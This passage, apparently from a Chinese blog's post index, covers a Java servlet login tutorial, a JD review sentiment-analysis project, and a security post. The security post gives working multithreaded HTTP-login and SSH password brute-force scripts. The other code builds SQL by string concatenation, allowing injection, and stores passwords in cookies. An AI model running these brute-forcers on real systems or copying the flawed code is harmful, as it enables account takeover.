&#x27;http://localhost:8080/brand-case/brand/update&#x27;, data: _this.updateBrand &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; _this.dialogUpdateVisible = false; _this.selectAll(); _this.msgbox(&quot;修改成功！&quot;); &#125; &#125;) &#125;, 登录注册功能实现登录功能后端实现dao在src/main/java/com/itheima/mapper创建UserMapper接口 package com.itheima.mapper; import com.itheima.pojo.User; import org.apache.ibatis.annotations.Insert; import org.apache.ibatis.annotations.Param; import org.apache.ibatis.annotations.Select; public interface UserMapper &#123; /** * 用户登录 * 检查用户名和密码是否正确 * @param username * @param password * @return */ @Select(&quot;select * from tb_user where username = #&#123;username&#125; and password = #&#123;password&#125;&quot;) User select(@Param(&quot;username&quot;) String username, @Param(&quot;password&quot;) String password); &#125; service在src/main/java/com/itheima/service中创建UserService类 SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory(); /** * 用户登录方法 * @param username * @param password * @return */ public User Login(String username, String password)&#123; SqlSession session = sqlSessionFactory.openSession(); UserMapper mapper = session.getMapper(UserMapper.class); User user = mapper.select(username, password); if(user != null)&#123; return user; &#125;else &#123; return null; &#125; &#125; servlet在src/main/java/com/itheima/servler/web中创建LoginServlet package com.itheima.web.servlet; import com.itheima.pojo.User; import com.itheima.service.UserService; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.IOException; @WebServlet(value = &quot;/login&quot;) public class LoginServlet extends HttpServlet &#123; // 因为BrandService可能多次用到 所以变成成员变量 减少创建的次数 UserService userservice = new UserService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; System.out.println(&quot;login&quot;); //解决POST请求中文乱码问题 request.setCharacterEncoding(&quot;UTF-8&quot;); String username = request.getParameter(&quot;username&quot;); String password = request.getParameter(&quot;password&quot;); User user = userservice.Login(username, password); if(user != null)&#123; // 登录成功，页面跳转到了 brand.jsp // 保存用户的session信息 // 检查是否勾选记住密码 String remember = request.getParameter(&quot;remember&quot;); if(&quot;1&quot;.equals(remember))&#123; Cookie c_username = new Cookie(&quot;username&quot;, username); Cookie c_password = new Cookie(&quot;password&quot;, password); c_username.setMaxAge(3600*24*7); c_password.setMaxAge(3600*24*7); // 发送Cookie response.addCookie(c_username); response.addCookie(c_password); &#125; HttpSession session = request.getSession(); session.setAttribute(&quot;user&quot;, user); // 获取项目的虚拟路径 String contextPath = request.getContextPath(); request.getRequestDispatcher( &quot;/brand.html&quot;).forward(request,response); &#125;else &#123; // 登录失败，在页面显示登录失败的提示信息 request.setAttribute(&quot;login_msg&quot;,&quot;用户名或密码错误&quot;); request.getRequestDispatcher(&quot;/login.jsp&quot;).forward(request,response); &#125; &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; 前端实现&lt;div id=&quot;loginDiv&quot; style=&quot;height: 350px&quot;&gt; &lt;form action=&quot;/brand-case/login&quot; method=&quot;post&quot;id=&quot;form&quot;&gt; &lt;h1 id=&quot;loginMsg&quot;&gt;LOGIN IN&lt;/h1&gt; &lt;div id=&quot;errorMsg&quot;&gt;$&#123;login_msg&#125; $&#123;register_msg&#125;&lt;/div&gt; &lt;p&gt;Username:&lt;input id=&quot;username&quot; name=&quot;username&quot; value=&quot;$&#123;cookie.username.value&#125;&quot; type=&quot;text&quot;&gt;&lt;/p&gt; &lt;p&gt;Password:&lt;input id=&quot;password&quot; name=&quot;password&quot; value=&quot;$&#123;cookie.password.value&#125;&quot;type=&quot;password&quot;&gt;&lt;/p&gt; &lt;p&gt;Remember:&lt;input id=&quot;remember&quot; name=&quot;remember&quot; value=&quot;1&quot; type=&quot;checkbox&quot;&gt;&lt;/p&gt; &lt;div id=&quot;subDiv&quot;&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;login up&quot;&gt; &lt;input type=&quot;reset&quot; class=&quot;button&quot; value=&quot;reset&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href=&quot;register.jsp&quot;&gt;没有账号？&lt;/a&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; 注册功能后端实现dao/** * 查询是否存在相同的用户名 * @param username * @return */ @Select(&quot;select * from tb_user where username = #&#123;username&#125;&quot;) User selectUser(@Param(&quot;username&quot;) String username); /** * 用户注册 * @param user */ @Insert(&quot;insert into tb_user values (null, #&#123;username&#125;, #&#123;password&#125;)&quot;) void addUser(User user); service/** * 注册功能 * @param user * @return */ public boolean Register(User user)&#123; SqlSession session = sqlSessionFactory.openSession(); UserMapper mapper = session.getMapper(UserMapper.class); User u = mapper.selectUser(user.getUsername()); if(u == null)&#123; mapper.addUser(user); session.commit(); &#125; session.commit(); return u == null; &#125; servletpackage com.itheima.web.servlet; import com.itheima.pojo.User; import com.itheima.service.UserService; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebServlet(value = &quot;/register&quot;) public class RegisterServlet extends HttpServlet &#123; // 因为UserService可能多次用到 所以变成成员变量 减少创建的次数 UserService userservice = new UserService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; //解决POST请求中文乱码问题 request.setCharacterEncoding(&quot;UTF-8&quot;); String username = request.getParameter(&quot;username&quot;); String password = request.getParameter(&quot;password&quot;); String checkCode1 = request.getParameter(&quot;checkCode&quot;); User user = new User(); user.setUsername(username); user.setPassword(password); // 获取生成的验证码信息 HttpSession session = request.getSession(); String checkCode =(String) session.getAttribute(&quot;checkCode&quot;); // 比较用户输入的验证码 // 细节：checkCode为程序中定义的变量 比较时放在前面，否则可能出现空指针错误 if(!checkCode.equals(checkCode1))&#123; request.setAttribute(&quot;register_msg&quot;, &quot;验证码错误，请重新输入！&quot;); request.getRequestDispatcher(&quot;/register.jsp&quot;).forward(request,response); // 禁止注册 return ; &#125; boolean flag = userservice.Register(user); if(flag)&#123; request.setAttribute(&quot;register_msg&quot;,&quot;注册成功，请登录！&quot;); request.getRequestDispatcher(&quot;/login.jsp&quot;).forward(request,response); &#125;else&#123; request.setAttribute(&quot;register_msg&quot;,&quot;注册成功，请重试！&quot;); request.getRequestDispatcher(&quot;/regsiter.jsp&quot;).forward(request,response); &#125; &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; 前端实现&lt;div class=&quot;form-div&quot;&gt; &lt;div class=&quot;reg-content&quot;&gt; &lt;h1&gt;欢迎注册&lt;/h1&gt; &lt;span&gt;已有帐号？&lt;/span&gt; &lt;a href=&quot;login.jsp&quot;&gt;登录&lt;/a&gt; &lt;/div&gt; &lt;form id=&quot;reg-form&quot; action=&quot;/register&quot; method=&quot;post&quot;&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;用户名&lt;/td&gt; &lt;td class=&quot;inputs&quot;&gt; &lt;input name=&quot;username&quot; type=&quot;text&quot; id=&quot;username&quot;&gt; &lt;br&gt; &lt;span id=&quot;username_err&quot; class=&quot;err_msg&quot;&gt;$&#123;register_msg&#125;&lt;/span&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密码&lt;/td&gt; &lt;td class=&quot;inputs&quot;&gt; &lt;input name=&quot;password&quot; type=&quot;password&quot; id=&quot;password&quot;&gt; &lt;br&gt; &lt;span id=&quot;password_err&quot; class=&quot;err_msg&quot; style=&quot;display: none&quot;&gt;密码格式有误&lt;/span&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;验证码&lt;/td&gt; &lt;td class=&quot;inputs&quot;&gt; &lt;input name=&quot;checkCode&quot; type=&quot;text&quot; id=&quot;checkCode&quot;&gt; &lt;img id=&quot;checkCodeImg&quot; src=&quot;/checkCode&quot;&gt; &lt;a href=&quot;#&quot; id=&quot;changeImg&quot;&gt;看不清？&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div class=&quot;buttons&quot;&gt; &lt;input value=&quot;注 册&quot; type=&quot;submit&quot; id=&quot;reg_btn&quot;&gt; &lt;/div&gt; &lt;br class=&quot;clear&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; document.getElementById(&quot;changeImgg&quot;).onclick = function() &#123; //路径后面添加时间戳的目的是避免浏览器进行缓存静态资源 document.getElementById(&quot;checkCodeImg&quot;).src = &quot;/checkCode?&quot;+new Date().getMilliseconds(); &#125; &lt;/script&gt; 验证码模块借助验证码生成工具 在src/main/java/com/itheima/util引入生成验证码的类 将验证码显示在页面上 在src/main/java/com/itheima/servler/web创建CheckCodeServlet package com.itheima.web.servlet; import com.itheima.service.BrandService; import com.itheima.util.CheckCodeUtil; import javax.servlet.ServletException; import javax.servlet.ServletOutputStream; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebServlet(value = &quot;/checkCode&quot;) public class CheckCodeServlet extends HttpServlet &#123; // 因为BrandService可能多次用到 所以变成成员变量 减少创建的次数 private BrandService brandService = new BrandService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // 生成验证码 // 获取响应输出流 ServletOutputStream os = response.getOutputStream(); // 生成验证码图片显示在jsp页面上 String checkCode = CheckCodeUtil.outputVerifyImage(100, 50, os, 4); // 将生成的验证码信息发送到 /register 用于验证用户输入的验证码是否正确 // 将验证码存入session HttpSession codeSession = request.getSession(); codeSession.setAttribute(&quot;checkCode&quot;, checkCode); &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; 权限验证使用javaweb的三大组件 filer实现 在src/main/java/com/itheima/servler/web/filter中创建LoginFilter package com.sunzy.web.filter; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpSession; import java.io.IOException; //@WebFilter(&quot;/*&quot;) public class LoginFilter implements Filter &#123; public void init(FilterConfig config) throws ServletException &#123; &#125; public void destroy() &#123; &#125; @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException &#123; // 放行登录相关的资源 String urls[] = &#123;&quot;/login.jsp&quot;, &quot;/css/&quot;, &quot;/imgs/&quot;, &quot;register.jsp&quot;,&quot;/checkCode&quot;,&quot;/register&quot;,&quot;/login&quot;&#125;; HttpServletRequest req = (HttpServletRequest) request; StringBuffer requestURL = req.getRequestURL(); String url = requestURL.toString(); for(String u :urls )&#123; if(url.contains(u))&#123; chain.doFilter(request,response); return ; &#125; &#125; HttpSession session = req.getSession(); Object user = session.getAttribute(&quot;user&quot;); if(user != null)&#123; chain.doFilter(request, response); &#125;else &#123; request.setAttribute(&quot;login_msg&quot;, &quot;您尚未登录！&quot;); request.getRequestDispatcher(&quot;/login.jsp&quot;).forward(req, response); &#125; &#125; &#125;","tags":[{"name":"mybatis","slug":"mybatis","permalink":"https://sunzhengyu99.github.io/tags/mybatis/"},{"name":"servlet","slug":"servlet","permalink":"https://sunzhengyu99.github.io/tags/servlet/"}]},{"title":"python安全攻防","date":"2021-08-16T03:24:23.000Z","path":"2021/08/16/python安全攻防/","text":"多线程爆破账号密码文件目录 passwords：密码字典 username: 账号字典 result: 保存结果 WeakPass.py :破解程序 # -*- coding = utf - 8 -*- import threading import os import requests import time # 对字典的分块大小 BLOCK_SIZE = 1000 class ThreadWork: url = &quot;http://127.0.0.1/homework/brute/login.php&quot; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 &#x27; &#x27;(KHTML, like Gecko) &#x27; &#x27;Chrome/19.0.1036.7 Safari/535.20&#x27; &#125; def __init__(self, username, password): self.username = username self.password = password def run(self, username, password): data = &#123; &#x27;username&#x27;:username, &#x27;password&#x27;:password, &#x27;submit&#x27;:&#x27;%E7%99%BB%E5%BD%95&#x27; &#125; print(&quot;username:&#123;&#125;,password:&#123;&#125;&quot;.format(username,password)) response = requests.post(self.url, data=data, headers=self.headers) if &#x27;Login failed&#x27; in response.text: pass else: print(&quot;success!!! username:&#123;&#125;, password:&#123;&#125;&quot;.format(username, password)) resultFile = open(&#x27;result&#x27;, &#x27;w&#x27;) resultFile.write(&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;.format(username, password)) resultFile.close() # 程序终止，0表示正常退出 # os._exit(0) def start(self): for userItem in self.username: for pwdItem in self.password: self.run(userItem, pwdItem) def BruteForceHttp(): listUsername = [line.strip() for line in open(&quot;username&quot;,&#x27;r&#x27;)] listPassword = [line.strip() for line in open(&quot;passwords&quot;,&#x27;r&#x27;)] # 对密码和用户名进行分块处理 blockUsername = partition(listUsername, BLOCK_SIZE) blockPassword = partition(listPassword, BLOCK_SIZE) threads = [] # 将不同的密码子块分给不同的线程爆破 for sonUserBlock in blockUsername: for sonPwdBlock in blockPassword: work = ThreadWork(sonUserBlock, sonPwdBlock) workThread = threading.Thread(target=work.start) threads.append(workThread) for t in threads: t.start() for t in threads: t.join() # 将密码和账号分块函数 def partition(ls, size): res = [] for i in range(0,len(ls), size): res.append(ls[i: i+size]) return res if __name__ == &#x27;__main__&#x27;: time1 = time.time() BruteForceHttp() time2 = time.time() print(time2-time1) 七十万条的数据跑了快十分钟，有点不可思议。。。可能是服务器的问题 多线程破解SSH密码 passwords：密码字典 username: 账号字典 result: 保存结果 SSHattack:连接日志 brute_SSH.py: 破解程序 # -*- coding = utf - 8 -*- import optparse import threading import sys import os import paramiko class ThreadWork(threading.Thread): def __init__(self, ip, usernameBlock, passwordBlock, port): threading.Thread.__init__(self) self.ip = ip self.port = port self.usernameBlock = usernameBlock self.passwordBlock = passwordBlock def run(self, username, password): &#x27;&#x27;&#x27; 使用死循环 &#x27;&#x27;&#x27; while True: try: paramiko.util.log_to_file(&quot;SSHattack.log&quot;) ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) sys.stdout.write(&quot;[*]ssh[&#123;&#125;:&#123;&#125;:&#123;&#125; =&gt; &#123;&#125; \\n&quot;.format(username,password,self.port, self.ip)) ssh.connect(hostname=self.ip, port=self.port, username=username, password=password) ssh.close() print(&quot;[+]success!!! username: &#123;&#125;, password: &#123;&#125;&quot;.format(username , password)) resultFile = open(&#x27;../brutpass/result&#x27;, &#x27;a&#x27;) resultFile.write(&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;.format(username, password)) resultFile.close() os._exit(0) except paramiko.ssh_exception.AuthenticationException as e: break except paramiko.ssh_exception.SSHException as e: break def start(self): for userItem in self.usernameBlock: for pwdItem in self.passwordBlock: self.run(userItem, pwdItem) def partition(list, num): step = int(len(list) / num) if step == 0: step = num partition = [list[i:i+step] for i in range(0, len(list), step)] return partition def SshEXP(ip, usernameFile, passwordFile, threadNumber, sshPort): print(&quot;============爆破信息============&quot;) print(&quot;IP:&quot; + ip) print(&quot;UserName:&quot; + usernameFile) print(&quot;PassWord:&quot; + passwordFile) print(&quot;Threads:&quot; + str(threadNumber)) print(&quot;Port:&quot; + sshPort) print(&quot;=================================&quot;) listUsername = [line.strip() for line in open(&quot;../brutpass/username&quot;, &#x27;r&#x27;)] listPassword = [line.strip() for line in open(&quot;../brutpass/passwords&quot;, &#x27;r&#x27;)] # 读取账号文件和密码文件并存入对应列表 listUsername = [line.strip() for line in open(usernameFile)] listPassword = [line.strip() for line in open(passwordFile)] # 账号列表和密码列表根据线程数量进行分块 blockUsername = partition(listUsername, threadNumber) blockPassword = partition(listPassword, threadNumber) threads = [] # 每个线程分配一个账号密码子块 for sonUserBlock in blockUsername: for sonPwdBlock in blockPassword: work = ThreadWork(ip, sonUserBlock, sonPwdBlock, sshPort) # 创建线程 workThread = threading.Thread(target=work.start) # 在threads中加入线程 threads.append(workThread) # 开始子线程 for t in threads: t.start() # 阻塞主线程，等待所有子线程完成工作 for t in threads: t.join() if __name__ == &#x27;__main__&#x27;: parser = optparse.OptionParser(&#x27;usage: python %prog target [options] \\n\\n&#x27; &#x27;Example: python %prog 127.0.0.1 -u ./username -p ./passwords -t 20\\n&#x27;) # 添加目标主机参数-i parser.add_option(&#x27;-i&#x27;, &#x27;--ip&#x27;, dest=&#x27;IP&#x27;, default=&#x27;127.0.0.1&#x27;, type=&#x27;string&#x27;, help=&#x27;target IP&#x27;) # 添加线程参数-t parser.add_option(&#x27;-t&#x27;, &#x27;--threads&#x27;, dest=&#x27;threadNum&#x27;, default=10, type=&#x27;int&#x27;, help=&#x27;Number of threads [default = 10]&#x27;) # 添加用户名文件参数-u parser.add_option(&#x27;-u&#x27;, &#x27;--username&#x27;, dest=&#x27;userName&#x27;, default=&#x27;./username&#x27;, type=&#x27;string&#x27;, help=&#x27;username file&#x27;) # 添加密码文件参数-p parser.add_option(&#x27;-p&#x27;, &#x27;--password&#x27;, dest=&#x27;passWord&#x27;, default=&#x27;./password&#x27;, type=&#x27;string&#x27;, help=&#x27;password file&#x27;) # 添加SSH端口参数-P parser.add_option(&#x27;-P&#x27;, &#x27;--port&#x27;, dest=&#x27;port&#x27;, default=&#x27;22&#x27;, type=&#x27;string&#x27;, help=&#x27;ssh port&#x27;) (options, args) = parser.parse_args() SshEXP(options.IP, options.userName, options.passWord, options.threadNum, options.port) 使用方法 python brute_SSH.py -i 192.168.164.166 -u ./username -p ./passwords","tags":[]},{"title":"商品评价情感分析","date":"2021-08-06T07:26:13.000Z","path":"2021/08/06/maliciousUrls/","text":"项目综述 对给定的文本进行自动分类，对评价分成好评和差评 支持批量检测，并进行可视化展示 对所有评价进行词云展示 数据获取爬虫获取JD的商品评价，这里主要针对智能手机的评价 首先是分析如何获取到商品的评价 对商品评价进行提取 对获取的数据进行分类保存 获取评价首先进行搜索，比如关键词 为手机 self.startUrl = &quot;https://search.jd.com/Search?keyword=%s&amp;enc=utf-8&quot; % (quote(&#x27;手机&#x27;)) # jD起始搜索页面 之后获取商品的ID，可以在网页源码中提取//li[@class=&quot;gl-item&quot;]/@data-sku，具体的节点信息如下 获得商品ID后可以利用JD提供的评价API获取评论页面，如图 api接口如下 https://sclub.jd.com/comment/productPageComments.action?productId=100020210392&amp;score=3&amp;sortType=5&amp;page=2&amp;pageSize=10&amp;isShadowSku=0&amp;rid=0&amp;fold=1 其中需要改变的参数为 productId 商品ID score 评论的分类 1为差评 2为中评 3为好评 page 评论的页数 获取这个页面后就是对数据进行提取 数据提取 这里为了方便，先将提取到的数据保存在csv文件中，之后再写入到数据库中 上图中我们需要提取的数据只有评价部分的内容和打分数，也就是，content和socore的数据 这里可以将网页数据转换成json数据后提取，很方便 res_json = json.loads(response.text) for cdit in res_json[&#x27;comments&#x27;]: # comment = cdit[&#x27;content &#x27;].replace(&quot;\\n&quot;, &#x27; &#x27;) comment = cdit[&#x27;content&#x27;].replace(&quot;\\n&quot;, &#x27; &#x27;).replace(&#x27;\\r&#x27;, &#x27; &#x27;) comments.append(comment) scores.append(cdit[&#x27;score&#x27;]) print(comment) 数据保存savepath = &#x27;./&#x27; + self.categlory + &#x27;_&#x27; + self.comtype[score] + &#x27;.csv&#x27; logging.warning(&quot;已爬取%d 条 %s 评价信息&quot; % (len(comments), self.comtype[score])) with open(savepath, &#x27;a+&#x27;, encoding=&#x27;utf8&#x27;) as f: for i in range(len(comments)): f.write(&quot;%d\\t%s\\t%s\\n&quot; % (i, scores[i], comments[i])) logging.warning(&quot;数据已保存在 %s&quot; % (savepath)) 贝叶斯分类 1.加载语料，打乱语料顺序，将语料分为评论和好评/差评2.去除评论中的英文、停用词3.将全部语料按1:4分为测试集与训练集4.使用CountVectorize构造词袋模型5.使用TfidfTransformer计算tf-idf值作为特征 6.选择多个分类器进行分类(也可以只用一个，这里只用了多项式)7.选择合适的模型并保存 加载语料def load_corpus(file_path_pos,file_path_nag): with open(file_path_pos, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) rows = [row for row in reader] with open(file_path_nag, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) rows_2 = [row for row in reader] rows.extend(rows_2) # 将读取出来的语料转为list review_data = np.array(rows).tolist() # 打乱语料的顺序 random.shuffle(review_data) review_list = [] sentiment_list = [] # 第一列为差评/好评， 第二列为评论 for words in review_data: review_list.append(words[0].split(&quot;\\t&quot;)[2]) if(words[0].split(&quot;\\t&quot;)[1][0] == &#x27;5&#x27;): sentiment_list.append(1) else: sentiment_list.append(0) return review_list, sentiment_list 生成的数据如下 去除评论中的英文、停用词这一步的目的是方便后面的词频统计 def load_stopwords(file_path): # 加载停顿词 stop_words = [] with open(file_path, encoding=&#x27;UTF-8&#x27;) as words: stop_words.extend([i.strip() for i in words.readlines()]) return stop_words def review_to_text(review): stop_words = load_stopwords(stopword_path) # 去除英文 review = re.sub(&quot;[^\\u4e00-\\u9fa5^a-z^A-Z]&quot;, &#x27;&#x27;, review) # print(review) review = jieba.cut(review) # 去掉停用词，将句子划分成一个个的单词 例如：[&#x27;赞赞赞&#x27;, &#x27;不错&#x27;, &#x27;很漂亮&#x27;, &#x27;外壳&#x27;] words = [] if stop_words: all_stop_words = set(stop_words) words = [w for w in review if w not in all_stop_words] print(words[:4]) return words 最后经过处理 review_train = [&#x27; &#x27;.join(review_to_text(review)) for review in train_review_list] review_test = [&#x27; &#x27;.join(review_to_text(review)) for review in test_review_list] 呈现如下的效果 训练模型# 加载语料 review_list, sentiment_list = load_corpus(file_path_pos,file_path_nag) # 将全部语料按1:4分为测试集与训练集 n = len(review_list) // 5 train_review_list, train_sentiment_list = review_list[n:], sentiment_list[n:] test_review_list, test_sentiment_list = review_list[:n], sentiment_list[:n] print(&#x27;训练集数量： &#123;&#125;&#x27;.format(str(len(train_review_list)))) print(&#x27;测试集数量： &#123;&#125;&#x27;.format(str(len(test_review_list)))) # 用于训练的评论 review_train = [&#x27; &#x27;.join(review_to_text(review)) for review in train_review_list] # 将句子中的单词重新拼接，形成无停顿词的句子 # 对于训练评论对应的好评/差评 sentiment_train = train_sentiment_list # 用于测试的评论 review_test = [&#x27; &#x27;.join(review_to_text(review)) for review in test_review_list] print(review_test[:3]) # 对于测试评论对应的好评/差评 sentiment_test = test_sentiment_list vectorizer = CountVectorizer(max_df=0.8, min_df=3) tfidftransformer = TfidfTransformer() # 先转换成词频矩阵，再计算TFIDF值 tfidf = tfidftransformer.fit_transform(vectorizer.fit_transform(review_train)) # 朴素贝叶斯中的多项式分类器，训练模型 clf = MultinomialNB().fit(tfidf, sentiment_train) # 将模型保存pickle文件 with open(model_export_path, &#x27;wb&#x27;) as file: d = &#123; &quot;clf&quot;: clf, &quot;vectorizer&quot;: vectorizer, &quot;tfidftransformer&quot;: tfidftransformer, &#125; pickle.dump(d, file) print(&quot;训练完成&quot;) 使用测试数据集验证该模型的准确性 count_vec = CountVectorizer(max_df=0.8, min_df=3) tfidf_vec = TfidfTransformer() # 定义Pipeline对全部步骤的流式化封装和管理，可以很方便地使参数集在新数据集（比如测试集）上被重复使用。 def MNB_Classifier(): return Pipeline([ (&#x27;count_vec&#x27;, count_vec), (&#x27;tfidf_vec&#x27;, tfidf_vec), (&#x27;mnb&#x27;, MultinomialNB()) ]) mnbc_clf = MNB_Classifier() # 进行训练 mnbc_clf.fit(review_train, sentiment_train) # 测试集准确率 print(&#x27;测试集准确率： &#123;&#125;&#x27;.format(mnbc_clf.score(review_test, sentiment_test))) 准确性可以达到88%，是一个不错的结果 可视化网页数据库将爬取的评论写入数据库，将网页中输入的检测数据和结果写入数据库，以及用户登录账号密码 所以需要三个数据表保存上面提到的三种数据 这里使用脚本一键完成 # -*- coding = utf - 8 -*- #@Time : 2021/8/6 22:35 #@Author : sunzy #@File : db_helper.py import re import csv import random import pymysql conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) def createTable(): sql = &quot;create table comment(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot; cur = conn.cursor() cur.execute(sql) cur.close() def createTable1(): sql = &quot;create table user(id int primary key auto_increment,username varchar(80),password varchar(200))&quot; cur = conn.cursor() cur.execute(sql) cur.close() def createTable2(): sql = &quot;create table result(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot; cur = conn.cursor() cur.execute(sql) cur.close() createTable() createTable1() createTable2() with open(&#x27;手机_nagetive.csv&#x27;, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) for row in reader: r = &#x27;&#x27;.join(row) cursor = conn.cursor() cursor.execute(&quot;insert into `comment` values(null, %s, &#x27;差评&#x27;)&quot;, (r.split()[2])); conn.commit() cursor.close() with open(&#x27;手机_positive.csv&#x27;, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) for row in reader: r = &#x27;&#x27;.join(row) cursor = conn.cursor() cursor.execute(&quot;insert into `comment` values(null, %s, &#x27;好评&#x27;)&quot;, (r.split()[2])); conn.commit() cursor.close() 用户注册和登录用户的注册和登录逻辑很简单，就是与数据库进行交互 @app.route(&#x27;/addUser&#x27;,methods=[&#x27;POST&#x27;]) def addUser(): get_json = request.get_json() name = get_json[&#x27;name&#x27;] password = get_json[&#x27;password&#x27;] conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) cursor = conn.cursor() sql = &quot;insert into `user` values(null,&#x27;&quot;+name+&quot;&#x27;,&#x27;&quot;+password+&quot;&#x27;,&#x27;user&#x27;)&quot; cursor.execute(sql); conn.commit() table_result = &#123;&quot;code&quot;: 200, &quot;msg&quot;: &quot;成功&quot;&#125; cursor.close() conn.close() return jsonify(table_result) @app.route(&#x27;/loginByPassword&#x27;,methods=[&#x27;POST&#x27;]) def loginByPassword(): get_json = request.get_json() name = get_json[&#x27;name&#x27;] password = get_json[&#x27;password&#x27;] conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) cursor = conn.cursor() cursor.execute(&quot;select count(*) from `user` where `username` = &#x27;&quot; + name +&quot;&#x27; and password = &#x27;&quot; + password+&quot;&#x27;&quot;); count = cursor.fetchall() if(count[0][0] != 0): table_result = &#123;&quot;code&quot;: 200, &quot;msg&quot;: name&#125; else: table_result = &#123;&quot;code&quot;: 500, &quot;msg&quot;: &quot;失败&quot;&#125; cursor.close() conn.close() return jsonify(table_result) 用户成功登录后，js脚本会重定向到index.html页面，进入系统主页 form.on(&#x27;submit(login-submit)&#x27;, function (obj) &#123; $.ajax(&#123; type: &quot;post&quot;, contentType: &#x27;application/json&#x27;, url: &quot;http://127.0.0.1:5000/loginByPassword&quot;, data: JSON.stringify(obj.field), dataType: &#x27;json&#x27;, success: function (data) &#123; if (data.code == &#x27;200&#x27;) &#123; layer.msg(&#x27;登录成功&#x27;, &#123; icon: 1, time: 1500 &#125;, function () &#123; location.replace(&#x27;../../index.html&#x27;) //重定向到index.html &#125;) &#125; else &#123; layer.alert(data.msg, &#123;icon: 2&#125;, function (index) &#123; layer.close(index); &#125;); &#125; &#125; &#125;) return false; &#125;); 词云展示使用echarts生成词云 @app.route(&#x27;/top&#x27;,methods=[&#x27;GET&#x27;]) def top(): jsondata = &#123;&#125; if(len(request.args)!=0): if(request.args[&#x27;category&#x27;]==&#x27;good&#x27;): jsondata[&#x27;data&#x27;] = good_datas else: jsondata[&#x27;data&#x27;] = bad_datas else: jsondata[&#x27;data&#x27;] = all_datas j = jsonify(jsondata) print(j) return j 数据获取 cursor.execute(&quot;select comment from `comment`&quot;); data_dict = [] result = cursor.fetchall() for field in result: data_dict.append(field[&#x27;comment&#x27;]) content = &#x27;&#x27;.join(data_dict) all_datas = [] jieba.analyse.set_stop_words(&#x27;./stopwords.txt&#x27;) tags = jieba.analyse.extract_tags(content, topK=100, withWeight=True) for v, n in tags: mydict = &#123;&#125; mydict[&quot;name&quot;] = v mydict[&quot;value&quot;] = str(int(n * 10000)) all_datas.append(mydict) cursor.close() js脚本 function init() &#123; form.render(); $.ajax(&#123; type: &#x27;GET&#x27;, url: &#x27;http://127.0.0.1:5000/top&#x27;, beforeSend: function(XMLHttpRequest) &#123; //注意，layer.msg默认3秒自动关闭，如果数据加载耗时比较长，需要设置time loadingFlag = layer.msg(&#x27;正在读取数据，请稍候……&#x27;, &#123; icon: 16, shade: 0.01, shadeClose: false, time: 60000 &#125;); &#125;, success: function(res) &#123; console.log(&#x27;初始化&#x27;) layer.close(loadingFlag); myCharts2.setOption(&#123; tooltip: &#123; show: true &#125;, series: [&#123; type: &quot;wordCloud&quot;, gridSize: 6, shape: &#x27;diamond&#x27;, sizeRange: [12, 50], width: 800, height: 500, textStyle: &#123; normal: &#123; color: function() &#123; return &#x27;rgb(&#x27; + [ Math.round(Math.random() * 160), Math.round(Math.random() * 160), Math.round(Math.random() * 160) ].join(&#x27;,&#x27;) + &#x27;)&#x27;; &#125; &#125;, emphasis: &#123; shadowBlur: 10, shadowColor: 